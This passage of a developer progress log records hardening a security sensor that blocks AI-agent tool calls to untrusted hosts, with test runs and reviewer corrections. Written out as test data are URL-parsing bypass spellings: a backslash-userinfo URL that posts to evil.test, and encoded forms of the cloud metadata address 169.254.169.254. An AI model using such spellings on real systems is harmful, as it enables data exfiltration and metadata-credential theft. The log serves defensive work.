# A2 — value-origin seam wiring: PROGRESS

Evidence goes here as the build runs, and failures are reported as failures.
Plan: `ARCHITECTURE.md`; brief: `BRIEF.md`; rulings: `docs/value-origin-rulings.md`.

How every run below was made, unless a line says otherwise:

- **macOS** (Darwin 25.6), CPython 3.12.2, in a scratch venv carrying pytest,
  httpx 0.28.1, urllib3 2.8.0, ada-url 4.0.0 and hatchling. The run uses
  `PYTHONPATH=<worktree>`, and `xaidr.__file__` was confirmed to be the worktree
  (memory: xaidr-worktree-venv-shadowing). The shared `.venv` was not used for
  these runs.
- **Linux:** `python:3.10-slim` (CPython 3.10.21) and `python:3.12-slim`
  (3.12.14). Each container copies the tree and runs `pip install '.[dev]'`.
- **Affected tests only.** The full suite was never run.

---

## M0 — finding 1, the backslash-userinfo authorization bypass (Q1). **Green. STOP AND REPORT.**

**STOP 2 / the owner's M0 STOP:** ENFORCE (M8) does not start until the owner
has seen this. The build continues with C-11 (M1), which does not depend on it.

**Commits.**
- Plan: `2f93115` (ARCHITECTURE.md).
- **M0 core change: `77ee2f8eea0c82804b403d180bc754e14af4b30d`, the new pin
  for paid**, in its own commit, as instructed. It is SEMANTIC:
  `expected.jsonl` moved, so paid's re-vendor bumps `EVALUATOR_GENERATION`
  (P4). It is not on `main`, so `vendor_value_origin.py`'s ancestry check
  refuses it until it is merged. Merging is the owner's call.
- Evidence: the commit after this one.

**The defect.** With `evil.test` recorded untrusted,
`http_post(url="https://corp.example\@evil.test/collect")` came back
**`principal`, AUTHORIZED, not blocked under ENFORCE**. The core read only the
WHATWG split (backslash is a slash: `corp.example`); httpx sends the request
to `evil.test`, and `urllib.parse` reads `evil.test` as its host. (Corrected at
review: an earlier draft said "httpx and urllib send". `urllib.request` passes
the netloc on (percent-DECODED, userinfo included; *M2 review: "raw" was false, it decodes `%31%36%39…` and reaches 169.254.169.254*) and reaches neither host.) This is the 1.15.0 userinfo bypass shape in new code.

**The fix (Q1, amends V-23).** Every reading of the authority split that a real
consumer performs is a finding, and the weakest decides. That is R1's shape.
In `xaidr/value_origin/_authority.py`:

- **WHATWG reading:** via `urlsplit`, as before.
- **RFC 3986 reading:** urllib.parse and httpx, computed on the value as
  written.
- **Refused WHATWG string:** where `urlsplit` refuses it, the value stays
  `parse_failure` (decision 7), and the WHATWG host the split still finds is
  added beside it.

The RFC and refusal readings use a written-out split, because `urlsplit`
differs across CPython patch releases (V-4).

### Failing test first — the red, before any core change

The conformance rows (`supplementary.jsonl`, through `convert.py`, so
`expected.jsonl` and SOURCE.json were regenerated, not hand-edited), the
ENFORCE pins, the result-side test, and the multi-oracle differential, all run
against the unfixed core:

```
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[V23-backslash]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED tests/value_origin_conformance/test_core.py::test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED tests/value_origin_conformance/test_core.py::test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED tests/value_origin_conformance/test_authority.py::test_q1_authority_of_answers_none_for_a_value_with_two_authorities
11 failed, 9 passed, 137 deselected in 0.07s

E  AssertionError: Q1-backslash-userinfo-bypass: should_block under ENFORCE is False (wire principal), Q1 says True —
   a call httpx/urllib send to an UNTRUSTED host walked through because the core read only the other side of the backslash
   [M2 note: this pasted message's "httpx/urllib send" was false when it ran. urllib.request reaches
    neither host; the test message was corrected at the M0 review. Kept verbatim because it is a pasted red.]
E  AssertionError: 3703 readings name a host the core never reads ({'urllib.parse': 1705, 'httpx': 1674, 'ada-url (WHATWG)': 324}):
   a call the transport sends there is invisible to value origin, and under ENFORCE an untrusted host walks through.
   First five: 'http://corp.example\\@evil.test' urllib.parse reads dns:evil.test, core reads ['dns:corp.example']; ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
```

### Two more defects found while proving it, each red first

1. **V-4: `urlsplit` is not the same function on every interpreter.** The first
   fix computed the RFC reading with `urlsplit`. In the Linux containers that
   gave 336 under-reads (httpx 288, ada 48), for example
   `http://[::1]\@evil.test`. Its bracketed-host validation, a security
   backport, raises there on 3.10.21 and 3.12.14 and returns `evil.test` on
   3.12.2, while httpx sends it to `evil.test` everywhere. Fixed with a
   written-out split. The pin, red with the `urlsplit` version on Linux:
   ```
   == previous RFC split, py3.10
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   == previous RFC split, py3.12   (same two)
   ```
2. **A sibling of finding 1, found by the adversarial corpus.**
   `http://&a:foo(b]c@d:2/` from WPT goes to `d` through httpx, urllib3 and
   WHATWG. `urlsplit` refuses it, so the core read nothing (`parse_failure`
   alone never blocks). Spellings of that shape were added to the grid first:
   ```
   E  AssertionError: 6993 readings name a host the core never reads ({'httpx': 864, 'urllib3': 945, 'ada-url (WHATWG)': 5184})
   ```
   The new pins were red against the previous fix:
   ```
   FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
   FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
   FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
   FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
   4 failed, 232 passed, 7 xfailed
   ```
3. **Over-reads.** These were caught by the over-read gate after the
   silent-failure review asked for `[` mid-host spellings:
   - 3,150 over-reads from reading past a mid-host `[` (`http:ev[il].test` read
     as `il`);
   - then 42 under-reads on 3.12.2, where `urlsplit` does read `il` from
     `http://[::1]\@ev[il].test`;
   - then 1,575 over-reads of bracketed non-IPv6 hosts (`http:[evil.test]`).

   **Then the milestone review.** The over-read class's stated reason was
   false ("an older `urllib.request` sends there"), and on macOS the class was
   absorbing 1,092 over-reads that even 3.12.2 refuses. Resolved by making the
   RFC reading reproduce **exactly** CPython 3.12.2's `urlsplit` checks and host
   rule, the most permissive version measured. The WHATWG fallback uses
   WHATWG's rule: a `[` must open the host and enclose IPv6. The class is now
   pinned both ways:
   - it absorbs **0** on 3.12.2, because urllib.parse there reads every host the
     core reads;
   - it absorbs **115** on 3.10.21 and 3.12.14, which refuse them.

### Green — the final code, three interpreters

The affected suites are `tests/value_origin_conformance/`,
`tests/test_differential_oracles.py`, `tests/test_differential_parsers.py`,
`tests/test_url_classes.py` and `tests/outside/`:

```
== macOS 3.12.2
499 passed, 12 xfailed in 21.01s
== linux 3.10
499 passed, 12 xfailed in 15.02s
== linux 3.12
499 passed, 12 xfailed in 10.93s
```

Counts on the committed differential corpus
(`scratchpad/count_grid.py`):

```
pre-fix core (base 25dc9de), macOS:  spellings=47124 under_reads=10780 {'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}
M0 core, macOS py3.12.2:             spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=0    unnamed_over_reads=0
M0 core, linux py3.10.21:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
M0 core, linux py3.12.14:            spellings=47124 under_reads=0  over_reads_absorbed_by_named_class=115  unnamed_over_reads=0
```

The 12 xfails are strict. There are 11 pre-existing ones, plus
`test_residual_empty_hex_part_is_the_zero_address`, found below. On Linux the
`dev` extra installs on both 3.10 and 3.12, so nothing skips.

### Sabotage proof, on the final code, both directions

Run on the commit candidate. Every Q1 reading is removed (`others = []` in
`url_authority`):

```
=== SABOTAGE on final M0 code: every Q1 reading removed — new gates
E  AssertionError: 10780 readings name a host the core never reads ({'urllib.parse': 1789, 'httpx': 2538, 'urllib3': 945, 'ada-url (WHATWG)': 5508}): ...
FAILED tests/test_differential_oracles.py::test_core_reads_every_host_any_consumer_reads
FAILED ...test_supplementary_case[V23-backslash]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-bypass]
FAILED ...test_supplementary_case[Q1-backslash-userinfo-mirror]
FAILED ...test_supplementary_case[Q1-backslash-nonspecial-scheme]
FAILED ...test_supplementary_case[Q1-urlsplit-refusal]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-nonspecial-scheme]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-backslash-userinfo-bypass]
FAILED ...test_q1_a_url_blocks_on_the_host_the_transport_reaches[Q1-urlsplit-refusal]
FAILED ...test_q1_a_poisoned_result_records_every_reading_of_its_url
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys0]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_33chars-keys1]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[value_37chars-keys2]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://[::1]\\@evil.test/x-keys6]
FAILED ...test_q1_every_reading_of_the_authority_split_is_a_finding[http://&a:foo(b]c@d:2/-keys7]
FAILED ...test_q1_authority_of_answers_none_for_a_value_with_two_authorities
16 failed, 221 passed, 8 xfailed
=== same sabotage — the gates that existed before M0 (must stay green)
128 passed, 4 xfailed
=== RESTORED (byte-identical)
237 passed, 8 xfailed
```

**The discriminating half.** Under the same sabotage, the gates that existed
before M0 stay green, which is why they never saw finding 1:

- `test_v19_every_spelling_resolves_to_the_host_urllib_parse_finds`, with one
  oracle and an already-normalised URL fed to it;
- `tests/test_differential_parsers.py`;
- `tests/test_url_classes.py`.

### Outside the process: built wheel, fresh venv, `python -I`, base against HEAD

`tests/outside/harness.py` imports no `xaidr`. The driver refuses unless
`xaidr` comes from the venv's site-packages. httpx was installed in each venv
to show where the transport sends the same string.

```
=== base: wheel from git archive 25dc9de (A1 merge)
  xaidr from out-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
=== head: wheel from the M0 working tree
  xaidr from out-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  benign-one-authority   wire=principal          blocks_under_ENFORCE=False findings=['dns:corp.example']  httpx_sends_to=docs.corp.example
  bypass                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:corp.example', 'dns:evil.test']  httpx_sends_to=evil.test
  mirror                 wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test', 'dns:corp.example']  httpx_sends_to=corp.example
  plain-untrusted        wire=untrusted_source   blocks_under_ENFORCE=True  findings=['dns:evil.test']  httpx_sends_to=evil.test
```

`tests/outside/test_m0_reading_set_from_the_wheel.py` asserts the HEAD half in
CI's `full` config. The base half is one-off evidence: CI checks out with depth
1, so the base commit is not there to build.

**Scope of "end to end".** No sensor seam is wired yet, so the end-to-end path
in M0 is the core's public interface, which paid vendors, exercised from the
installed wheel. The same flow through `Sensor.scan_tool_call` becomes
observable at M4. It is deferred by construction, not skipped.

### Adversarial verification: a corpus the build never saw

The corpus is web-platform-tests `url/resources/urltestdata.json` at
`c48d58747e1f211527fb695fd60548a997fae617` (sha256 `81e85fd3…f652`,
BSD-3-Clause). It was fetched to the scratchpad and not vendored; vendoring
comes with M2 (Q19). It ran through the same four oracles, 696 absolute inputs.
Every remaining under-read falls in a named class, and **none is a split
defect**:

```
WPT under-reads after M0, by class (oracle readings):
    71  whitespace/control: known residual (strict xfail)   e.g. 'http://example\t.\norg'
    66  file:/data: ruled never a destination (decision 6)   e.g. 'file://example:1/'
    49  relative / scheme-less reference: not a sendable URL (V-19)   e.g. '//foo/bar'
     9  mailto:// authority: not a fetchable scheme   e.g. 'mailto://example.com:8080/pathname?search#hash'
     2  empty-hex IP part: new strict xfail (integer family)   e.g. 'https://0x.0x.0'
```

### Q3: refuse, never skip

The `base` install has no dev extra:

```
--- base install, oracle tests run directly (must REFUSE, not skip):
      6 errors
      3 REFUSING: hatchling (dev extra) is not installed, so no wheel can be built ...
      3 REFUSING: oracle(s) ['httpx', 'urllib3', 'ada-url'] are not installed, so this differential cannot compare ...
--- base install, as CI base runs them (explicit deselect):
364 passed, 1 skipped, 6 deselected, 8 xfailed
```

The one skip is the existing `test_built_wheel` (no hatchling in `base`). It
predates A2, and the new tests do not repeat its pattern.

### Found, not fixed (strict xfail, pasted red on adoption)

- **Empty hex part.** `https://0x.0x.0/` is 0.0.0.0 to WHATWG (ada) and to the
  macOS libc resolver that httpx and urllib3 hand the name to. glibc does not
  read it that way. The core reads `dns:0x.0`, because `int("0x", 16)` raises in
  `coerce_ip`. This is IP canonicalisation in the integer family, and it is
  fixed where `coerce_ip` is shared (M3). It is not a Q1 split question.

### Decisions this milestone made that need the owner's ruling

All are recorded in `docs/value-origin-rulings.md`, under "Decisions made in
the A2 build (M0)":

1. The RFC 3986 reading is a written-out split that reproduces CPython 3.12.2's
   `urlsplit`, not this interpreter's `urlsplit` (V-4, measured). The WHATWG
   fallback uses WHATWG's bracket rule.
2. A value `urlsplit` refuses stays `parse_failure` and carries the hosts the
   other readings find. That is Q1 applied to a refusal, found by WPT.
3. `authority_of` returns `None` for a value with two authorities, as for a
   two-mailbox list.
4. Over-read class `urlsplit-bracket-validation`: hosts 3.12.2's
   urllib.parse reads and later patch releases refuse. It absorbs 0 on 3.12.2
   and 115 on 3.10.21 / 3.12.14, and is pinned both ways.

### What changed outside `xaidr/value_origin/`

- `pyproject.toml`: the `dev` extra gains `httpx`, `urllib3` and `ada-url`.
  These are test oracles, not runtime dependencies (Q3).
- `.github/workflows/ci.yml`: `base` runs `-m "not requires_dev_extra"`;
  `full` runs everything.
- `tests/conftest.py`: registers the `requires_dev_extra` marker.
- `expected.jsonl` changed, which is **semantic** for paid (§4.5, P4):
  - +5 rows: `Q1-backslash-userinfo-bypass`, `-mirror`,
    `-nonspecial-scheme`, `-readings-agree`, `Q1-urlsplit-refusal`;
  - `V23-backslash`'s findings gained `dns:corp.example` (principal). Its wire
    is still `unresolved`.
  - Paid's re-vendor must bump `EVALUATOR_GENERATION`.

### Fresh-context reviews

- **silent-failure-hunter.** No swallowed exception or empty-default fallback
  in the diff. Everything it ran was confirmed: the merge, the refuse
  behaviour, the outside harness, and the regenerated data, which only adds
  findings. It flagged one corpus gap: a `[` mid-host was never generated. That
  is now in the grid, and it exposed the over-read and under-read pair above,
  now fixed. Its specific example `https://user@corp.ex[ample]:8080/x` is read
  as `ample` by the RFC reading, and every current `urlsplit` refuses it, so it
  falls in the named class.
- **milestone-reviewer.** Five of six claims held. It ran the HEAD and fixed
  cores side by side, the refusal, the outside driver's refusal and the
  `convert.py` byte-identity. It found:
  1. **False:** "httpx and urllib send it to evil.test". urllib.request
     passes the netloc on, percent-decoded (*M2 review: not "raw"*); only urllib.parse reads evil.test. **Retracted in
     place** in `docs/value-origin-rulings.md` and the ARCHITECTURE.md F1 row
     and §2.3, and corrected in every test message, docstring and conformance
     rule text that said it. The grep comes back clean.
  2. **Not reproducible:** "3,703 under-reads across 31,752 spellings" came
     from the first grid. The committed corpus is 47,124 spellings, with 10,780
     under-reads pre-fix (pasted above). Retracted in place.
  3. **Wrong:** decision 4's "31 spellings, Linux only", and its reason. Fixed
     as above. The reviewer's own "macOS absorbs none" was also not what I
     measured: 1,092 then, 0 now.
  4. **Stale:** the rulings doc predated the bracket-rule change. Updated.

  The reviewer also noted the tree changed while it was reviewing. Every number
  in this file comes from the final commit candidate (`_authority.py`
  re-checked after the last edit).

---

## M1 — the C-11 gate, "RECORD never changes an action". **Green. STOP AND REPORT (BRIEF: before any seam wiring).**

**What was built.**
- `tests/test_value_origin_c11.py`: OFF against RECORD in `block` and
  `monitor` enforcement.
- `tests/outside/drivers/c11_oracle.py`: the passes as one module. The
  in-tree gate imports it, and it runs as a driver against built wheels, with
  `--base` for a wheel that predates the parameter and `--compare` for the
  cross-commit table.
- `tests/outside/test_m1_c11_from_the_wheel.py`: C-11 and the construction
  checks asserted in the built wheel (CI `full`).
- **Inert, loudly validated** `Sensor(value_origin="record",
  value_origin_sources=())` (V-34). Nothing reads either parameter yet. ENFORCE
  logs exactly ONE warning, saying what is true: value origin is **NOT YET
  WIRED**, so `enforce` changes no action today, and, with no designations,
  every destination a tool result names will be blocked once it enforces
  (C-11). Default, OFF and RECORD log nothing.

**The passes.** Main corpus, the 456 shell rows:

| pass | what it drives |
|---|---|
| P-input | byte-for-byte the existing oracle, computed by its own `_digest` |
| P-flow-I | T as principal input, then the calls built from T |
| P-flow-R | a neutral input, T as a tool result, then the calls |
| P-seam | T as a `protect_tools`-wrapped tool's return value |
| P-fault | circuit-open, gate, bounds fail-closed, scan-error and not-scannable exits, each one's marker counted |

The §3.3 adversarial corpora, which the gate was not built on:

| pass | what it drives |
|---|---|
| A-flow-I | heldout 100 prompts plus asi_battery 128 text rows, as principal input |
| A-flow-R | the same 228 texts as tool results |
| A-calls | benign_toolcalls 410 calls plus asi_battery 60 tool rows, arguments verbatim |
| A-steps | asi_battery's 52 multi-turn rows, 105 steps, replayed in one flow each |

Every one of asi_battery's 240 rows is driven by exactly one pass.

**What P-seam does NOT cover yet (corrected after the M1 review).**
`protect_tools` has no result position (ARCHITECTURE.md §1.2), so at M1 P-seam
covers **no** result seam: its digest is the same whatever the tool returns. M7
gives `protect_tools` its result position and adds the `langchain_core` and MCP
after-hooks. That is now written into M7's build list, not only here.

### Failing first

Before the constructor change:

```
16 failed, 5 xfailed in 0.30s
E   TypeError: DelphiSensor.__init__() got an unexpected keyword argument 'value_origin'   (x15)
```

The strict xfails had "passed" on that TypeError, which is the wrong reason.
All of them are now `raises=AssertionError`.

### Honest reds on the way (each corrected where it was asserted)

- **The call denominator** was first written as `>= 39`, from a scratch script.
  `calls_for()` gives `{'run_command': 456, 'http_post': 36, 'send_email': 2}`,
  now pinned exactly. ARCHITECTURE.md §3.2 is retracted in place.
- **asi_battery** was assumed to have 56 tool rows per file. That was the count
  WITHOUT `text`. It actually has three shapes: 64 text, 30 tool and 26
  multi-turn rows. The loader crashed (`KeyError: 'text'`) and then counted
  470 against a pinned 522. Both counts are now measured and pinned, and the
  multi-turn rows got their own pass instead of being skipped.

### Green: four interpreters

The suites are C-11, the 456-row oracle, `tests/outside/`, the conformance
suite and the multi-oracle differential:

```
== macOS 3.12.2      425 passed, 14 xfailed, 1 warning
== linux 3.10        425 passed, 14 xfailed
== linux 3.11        425 passed, 14 xfailed
== linux 3.12        425 passed, 14 xfailed
```

The one macOS warning did not recur when re-run with `-W
error::pytest.PytestWarning` (`425 passed, 14 xfailed`). It is recorded as
observed once, not reproduced.

The C-11 strict xfails (6 of the 14; the rest are the core's pre-existing
strict xfails) state the gate's vacuity:

```
XFAIL test_4a_I_..._input_derived_calls                      - not wired: RECORD records no input until M6
XFAIL test_4a_R_..._result_derived_calls[P-flow-R]            - not wired: RECORD records no tool result until M7
XFAIL test_4a_R_..._result_derived_calls[P-seam]              - not wired: RECORD records no tool result until M7
XFAIL test_4b_enforce_moves_an_action_...[P-flow-I|P-flow-R|P-seam] - not wired: nothing can block until M8
```

4a-R is one assertion per pass, because the public `scan(tool_result)` alone
would flip a pooled count at M7 (the M1 review).

### Sabotage, on the final code

```
=== SABOTAGE A: inert RECORD appends a rule on the INPUT path
FAILED ...test_record_moves_no_verdict_score_or_rule[P-input-block]
FAILED ...test_record_moves_no_verdict_score_or_rule[P-input-monitor]
FAILED ...test_record_moves_no_action_on_the_adversarial_corpora[A-steps-block]
FAILED ...test_record_moves_no_action_on_the_adversarial_corpora[A-steps-monitor]
4 failed, 15 passed, 16 deselected
--- existing 456-row oracle (must stay green):
4 passed
=== SABOTAGE B: inert RECORD flags allowed TOOL CALLS
FAILED ...[P-flow-I-block] [P-flow-I-monitor] [P-flow-R-block] [P-flow-R-monitor]
FAILED ...[P-seam-block] [P-seam-monitor] [P-fault-block] [P-fault-monitor]
FAILED ...adversarial_corpora[A-flow-I-block] [A-flow-I-monitor] [A-flow-R-block] [A-flow-R-monitor]
FAILED ...adversarial_corpora[A-calls-block] [A-calls-monitor] [A-steps-block] [A-steps-monitor]
16 failed, 3 passed, 16 deselected
--- existing 456-row oracle (must stay green):
4 passed
=== SABOTAGE C: the warning fires on EVERY construction (the M1 reviewer's probe)
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs0-0]
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs1-0]
FAILED ...test_construction_warns_only_for_enforce_and_says_what_is_true[kwargs2-0]
3 failed, 2 passed, 30 deselected
=== RESTORED (byte-identical)
33 passed, 6 xfailed
```

- **The discriminating half of A and B:** the existing oracle stays green. It
  never calls `scan_tool_call` (F4), and both of its sensors run the default
  mode, so a RECORD regression moves them equally.
- **Sabotage C** is the gap the milestone reviewer demonstrated: the first
  version of the warning test stayed green under it. It is now red.

### Outside the process, across commits

See the next section: it is run on the COMMITTED M1 tree, so the evidence
names a SHA.

### Fresh-context reviews

- **silent-failure-hunter:** nothing silent found. It ran checks rather than
  reading code:
  - the strict xfails fail for the right reason (`--runxfail`);
  - the call count;
  - the raise order is preserved;
  - `protect()` forwards the new keywords, because its accepted set comes from
    `inspect.signature`;
  - there is no state leak in either file order, alongside the conformance and
    `protect` suites;
  - the breaker really stays open;
  - the driver's refusals return non-zero.
- **milestone-reviewer:** it reproduced every central claim: P-input equals
  the real `_digest`, failing first, both sabotages, and identical
  cross-commit digests. It found the following, all fixed and re-verified
  above:
  1. the warning had no must-stay-quiet test, and its text claimed blocking
     while inert;
  2. P-input was compared against a hand copy of the oracle, not the oracle's
     own function;
  3. 4a-R was pooled;
  4. the P-seam deferral was understated, and absent from M7's build list;
  5. a nonexistent `scripts/c11_oracle.py` was named in the plan;
  6. the §3.3 adversarial re-run was silently dropped;
  7. the outside "`enforec` raises" check was missing;
  8. the cross-commit table came from an uncommitted tree and a scratchpad
     script;
  9. PROGRESS.md said C-11 runs in "the full config only". The in-tree gate
     has no marker, so it runs in BOTH configs, about 15 to 25 s per Python;
     only the outside test is `full`-only.

### What C-11 does NOT yet prove

Nothing is wired, so **RECORD ≡ OFF holds because RECORD does nothing yet**.
The six strict xfails say so. What M1 establishes is:
1. the instrument, with every pass and every fault path reached;
2. the baseline, identical across commits from the built wheel;
3. that the gate catches a RECORD regression on the input path, on the tool
   path, across turns, and on corpora it was not built on, none of which the
   existing oracle can see.

### CI

CI did not run. It triggers on `pull_request` and on pushes to `main`, the
instruction is to push the branch only, and no PR was opened.

### M1 outside the process, across commits, pinned to SHAs

Wheels were built from `git archive 25dc9de` (base) and `git archive a4df0e6`
(the M1 commit), each in a fresh venv, using the committed harness and driver:

```
$ git archive a4df0e6 | tar -x -C m1-tree    # and base-tree from git archive 25dc9de
$ python -I m1-tree/tests/outside/harness.py base-tree c11-base c11_oracle.py -- --base > c11_base.json
  exit 0
$ python -I m1-tree/tests/outside/harness.py m1-tree c11-head c11_oracle.py > c11_head.json
  exit 0
$ python m1-tree/tests/outside/drivers/c11_oracle.py --compare c11_base.json c11_head.json
base xaidr: c11-base/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
head xaidr: c11-head/venv/lib/python3.12/site-packages/xaidr/__init__.py | py 3.12.2
  block   A-calls    base=da99beb148b8 off=da99beb148b8 record=da99beb148b8 enforce=da99beb148b8  IDENTICAL
  block   A-flow-I   base=b8088580c868 off=b8088580c868 record=b8088580c868 enforce=b8088580c868  IDENTICAL
  block   A-flow-R   base=e30d17b1bbbc off=e30d17b1bbbc record=e30d17b1bbbc enforce=e30d17b1bbbc  IDENTICAL
  block   A-steps    base=bb062c8e336d off=bb062c8e336d record=bb062c8e336d enforce=bb062c8e336d  IDENTICAL
  block   P-fault    base=0cab68adc932 off=0cab68adc932 record=0cab68adc932 enforce=0cab68adc932  IDENTICAL
  block   P-flow-I   base=0d89307249ea off=0d89307249ea record=0d89307249ea enforce=0d89307249ea  IDENTICAL
  block   P-flow-R   base=bc8f93094a59 off=bc8f93094a59 record=bc8f93094a59 enforce=bc8f93094a59  IDENTICAL
  block   P-input    base=80f31ff0b5d5 off=80f31ff0b5d5 record=80f31ff0b5d5 enforce=80f31ff0b5d5  IDENTICAL
  block   P-seam     base=c0c7b885462b off=c0c7b885462b record=c0c7b885462b enforce=c0c7b885462b  IDENTICAL
  monitor A-calls    base=bc96eee1be21 off=bc96eee1be21 record=bc96eee1be21 enforce=bc96eee1be21  IDENTICAL
  monitor A-flow-I   base=b8088580c868 off=b8088580c868 record=b8088580c868 enforce=b8088580c868  IDENTICAL
  monitor A-flow-R   base=e30d17b1bbbc off=e30d17b1bbbc record=e30d17b1bbbc enforce=e30d17b1bbbc  IDENTICAL
  monitor A-steps    base=8cc17aa1d456 off=8cc17aa1d456 record=8cc17aa1d456 enforce=8cc17aa1d456  IDENTICAL
  monitor P-fault    base=f5a1cdb40a4f off=f5a1cdb40a4f record=f5a1cdb40a4f enforce=f5a1cdb40a4f  IDENTICAL
  monitor P-flow-I   base=dfc965d823fd off=dfc965d823fd record=dfc965d823fd enforce=dfc965d823fd  IDENTICAL
  monitor P-flow-R   base=f7a15b56474d off=f7a15b56474d record=f7a15b56474d enforce=f7a15b56474d  IDENTICAL
  monitor P-input    base=51e3814f8b8d off=51e3814f8b8d record=51e3814f8b8d enforce=51e3814f8b8d  IDENTICAL
  monitor P-seam     base=b48742e05acc off=b48742e05acc record=b48742e05acc enforce=b48742e05acc  IDENTICAL
cross-commit: all identical
  exit 0
--- construction checks from the a4df0e6 wheel:
  enforec_rejected: value_origin mode: expected one of ['off', 'record', 'enforce'], got 'enforec'
  warnings: {'default': 0, 'enforce': 1, 'enforce+designation': 1, 'off': 0, 'record': 0}
```

`80f31ff0…` (P-input, block) is the oracle digest `docs/enterprise-seams-design.md`
recorded for earlier seams.

---

## The owner's open M0 question: what reaches the verdict when `authority_of` is None

**Answer: None never reaches the verdict.** `authority_of` is not on the
verdict path. In `xaidr/`, its only uses are its definition and the export in
`value_origin/__init__.py`. The verdict path is:

- `evaluate_call` (`_evaluate.py`);
- then `extract_destinations` (`_extract.py`);
- then `classify_value(leaf, arg_mode=True)` (`_authority.py`).

For a two-host value, `classify_value` returns a **list**, and
`extract_destinations` emits one `Finding` per host (`out.extend(...)`). Each
is looked up, and the weakest wire decides. Executed at M3:

```
authority_of(url)            = None
extract_destinations         = [('dns:corp.example', None), ('dns:evil.test', None)]
evaluate_call.wire           = untrusted_source | findings: [('dns:corp.example', 'principal'), ('dns:evil.test', 'untrusted_source')]
should_block(ENFORCE)        = True
key_authority(url) [designation key arg] = None -> no authority basis; only an n-gram could authorize the key
```

Two other sites have the same "one answer or None" shape. Both fail closed:

- **The recording side.** `result_authorities` and `prose_candidates` extend
  with every host of the list. Both readings are recorded.
- **`key_authority`, the designation's key argument (`_ledger._KeyPlan`).**
  None means the key has no authority basis. The read is then trusted only if
  an n-gram authorizes the key. A two-host URL is not a valid n-gram (V-8d
  refuses it), so the read records `untrusted_source`.

So None means "no single authority". It never means "no destination".

---

## M2 — the url_parse differential, tests only. **Green.**

**Commit `f95f5df`.** The tests are at the bottom of
`tests/test_differential_oracles.py`. They live in M0's multi-oracle module,
not in `test_differential_parsers.py` as §2.4 said. They need the dev-extra
oracles and share M0's refuse-not-skip fixture. The core half of §2.4 was
delivered at M0 as `test_core_reads_every_host_any_consumer_reads`.

**What it compares.**
- The code under test is `parse_url(url).address`.
- It is compared with the address class each of four consumers reaches:
  urllib.parse, httpx, urllib3 and ada (WHATWG).
- Each consumer's host goes to the platform resolver the way a Python client
  hands it over: `socket.getaddrinfo(str, AI_NUMERICHOST)`, which runs Python's
  IDNA codec and then libc's numeric parse.
- Superset rule: `address` must be at least as severe as the most severe class
  any consumer reaches.
- The grid is 24,960 spellings: url_diff.py's axes widened with M0's split
  prefixes, the mirror tail and `_urls()`'s userinfo forms.

### Red: every strict xfail at M2, by `--runxfail` (macOS 3.12.2)

```
[special-scheme-without-//] 6304 spellings ... (reached by {'ada-url (WHATWG)': 6304}); 'http:169.254.169.254': url_parse=None ...
[backslash] 2742 ... (reached by {'ada-url (WHATWG)': 2213, 'urllib3': 2002, 'httpx': 252, 'urllib.parse': 252}); 'http://169.254.169.254\\x': url_parse=None
[urlsplit-refusal] 528 ... (reached by {'ada-url (WHATWG)': 516, 'httpx': 360, 'urllib3': 420}); 'http://&a:foo(b]c@169.254.169.254': url_parse=None
[fullwidth] 252 ... 'http://169．254．169．254': url_parse=None, ada-url (WHATWG), httpx, urllib.parse reach link_local
[percent-encoded-host] 210 ... 'http://%31%36%39.254.169.254': url_parse=None, ada-url (WHATWG), urllib3 reach link_local
